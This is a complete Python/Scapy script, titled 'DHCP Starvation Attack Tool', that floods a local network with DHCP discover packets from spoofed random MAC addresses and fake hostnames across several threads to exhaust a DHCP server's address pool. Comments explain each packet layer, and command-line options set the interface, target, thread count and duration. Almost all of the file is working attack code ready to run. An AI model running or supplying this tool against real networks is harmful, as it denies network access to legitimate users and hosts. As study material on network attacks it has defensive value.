#!/usr/bin/env python3
from scapy.all import *
from random import randint
import time
import threading
import argparse
import ipaddress

used_macs = set()  # To keep track of used MAC addresses
macs_lock = threading.Lock()  # Lock for thread-safe MAC generation 

def generate_random_mac():  # Generates a 6 byte random MAC address
    return ":".join([f"{randint(0x00, 0xff):02x}" for _ in range(6)])

def generate_unique_mac():
    while True:
        mac = generate_random_mac()
        with macs_lock:
            if mac not in used_macs:
                used_macs.add(mac)
                return mac

used_hostnames = set() 
hostnames_lock = threading.Lock() 

# Function to generate unique hostnames, the MAC is in bytes format
def generate_unique_hostname(): 
    while True: 
        name = f"fake-client-{randint(1, 10000)}"
        with hostnames_lock:
            if name not in used_hostnames:
                used_hostnames.add(name)
                return name



def dhcp_starvation(interface, dhcp_server_ip, network_range, num_threads=5, duration=60):
    def starvation_thread():
        packet_counter = 0;
        end_time = time.time() + duration
        while time.time() < end_time:
            # Generate random fake MAC and hostname for each request
            mac = generate_unique_mac()
            hostname = generate_unique_hostname()

            # This packet is used to flood the legitimate DHCP server
            # and exhaust its IP pool (DHCP starvation attack).
            #
            # Packet Structure (Layer by Layer):
            #
            # 1. Ethernet Layer:
            #    - src: Fake MAC address (spoofed for each request)
            #    - dst: Broadcast address (ff:ff:ff:ff:ff:ff), so all hosts see it
            #
            # 2. IP Layer:
            #    - src: 0.0.0.0 (client has no IP yet)
            #    - dst: 255.255.255.255 (broadcast to all devices on LAN)
            #
            # 3. UDP Layer:  (Not TCP, because DHCP uses UDP as it's connectionless)
            #    - sport: 68 (DHCP client port)
            #    - dport: 67 (DHCP server port)
            #
            # 4. BOOTP Layer: (DHCP is built on top of BOOTP.)
            #    - chaddr: Client hardware address (fake MAC, in bytes)
            #    - xid: Random transaction ID to identify request-response pair
            #
            # 5. DHCP Options:
            #    - message-type: 'discover' (DHCP discovery message)
            #    - client_id: The same fake MAC used for chaddr
            #    - hostname: A randomly generated fake hostname (e.g., "fake-client-123")
            #    - param_req_list: A list of parameters the client wants (e.g., subnet mask, gateway, DNS, etc.)
            #    - end: Indicates end of DHCP options

            dhcp_discover = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
                           IP(src="0.0.0.0", dst="255.255.255.255") / \
                           UDP(sport=68, dport=67) / \
                           BOOTP(op = 1,chaddr=mac2str(mac), xid=randint(1, 0xFFFFFFFF)) / \
                           DHCP(options=[("message-type", "discover"),  # sets packet[DHCP].options[0][1] = 1
                                        ("client_id", mac),
                                        ("hostname", hostname),
                                        ("param_req_list", [1, 3, 6, 15, 31, 33, 43, 44, 46, 47, 119, 121, 249, 252]),
                                        "end"])
            
            # Send the packet
            sendp(dhcp_discover, iface=interface, verbose=0) # via Scapy
            packet_counter += 1
            if packet_counter % 500 == 0:  # Print status every 500 packets
                print(f"[*] Thread-{threading.current_thread().name} sent {packet_counter} packets")

            time.sleep(0.001)  # Small delay to avoid overwhelming the system

    # Threads to perform the DHCP starvation attack parallelly
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=starvation_thread)
        t.start()
        threads.append(t)
    
    # Wait for all threads to complete
    for t in threads:
        t.join()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DHCP Starvation Attack Tool")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to use") # -i eth0
    parser.add_argument("-s", "--server", required=True, help="Target DHCP server IP") # -s 192.168.1.1; Not actually needed.
    parser.add_argument("-n", "--network", required=True, help="Network range to attack (e.g., 192.168.1.0/24)") # -n 192.168.1.0/24
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads to use") # -t 5 
    parser.add_argument("-d", "--duration", type=int, default=60, help="Attack duration in seconds") # -d 60
    
    args = parser.parse_args()
    
    print(f"[*] Starting DHCP starvation attack on {args.server} via {args.interface}")
    print(f"[*] Using {args.threads} threads for {args.duration} seconds")
    
    dhcp_starvation(args.interface, args.server, args.network, args.threads, args.duration)
    
    print("[*] DHCP starvation attack completed")